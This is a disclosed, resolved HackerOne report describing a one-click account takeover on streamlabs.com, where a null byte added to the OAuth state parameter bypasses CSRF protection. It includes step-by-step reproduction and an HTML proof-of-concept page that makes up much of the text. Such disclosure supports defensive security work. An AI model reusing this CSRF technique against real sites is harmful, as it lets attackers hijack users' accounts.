---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1046630'
original_report_id: '1046630'
title: One Click Account takeover using Ouath CSRF bypass by adding Null byte %00
  in state parameter on  www.streamlabs.com
weakness: Cross-Site Request Forgery (CSRF)
team_handle: logitech
created_at: '2020-11-29T19:03:34.763Z'
disclosed_at: '2021-01-06T15:15:53.288Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 86
asset_identifier: '*.streamlabs.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on  www.streamlabs.com

## Metadata

- HackerOne Report ID: 1046630
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: logitech
- Disclosed At: 2021-01-06T15:15:53.288Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary**

Hello Team

I have found a bypass to the this report. #1039749 

**Steps To Reproduce:**

1. Login to attacker's account and go to settings --> account settings.

2. Intercept the request in burp suite and click on merge twitch account.

3. Allow twitch access and once you see a get request in burp with host streamlabs.com and parameters code, scope and state then generate CSRF PoC 
      from burp suite and drop that request. (We dropped this request in order not to consume the code as it can be used only once)

4. Add null byte character in state parameter and host that CSRF PoC on attacker.com and ask victim to visit attacker.com

5. Once victim visits attacker.com attacker's twitch account will be connected to victim's account.

6. Now attacker will login to victim's streamlabs.com using his twitch account.

**PoC:**

Login to your streamlabs account and Visit the the  link: https://pawned.trueindian1.repl.co and click on the button.

```
<html>
<head>
<style>
h1 {text-align: center;}
p {text-align: center;}
div {text-align: center;}
</style>
</head>
<body>
<h1>One Click Account Takeover PoC By C0nquer0rs</h1>
<p>Click the button to go to the Streamlabs and check you're account settings.</p>
<h1><button onclick="document.location='https://streamlabs.com/auth?code=e5p67p5r6vjizvpl2fj756625zv8ra&scope=user_read&state=b33a75be1737978b4c5ea22f7bf53078c86256db-merge%00'">Click Me</button><h1>
</body>
</html>
```

## Impact

Attacker can connect his Facebook, you tube, twitch, Mixer, Periscope, Picarto, PayPal with anybody account who visits attacker's website and can easily takeover Victim's streamlabs account.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
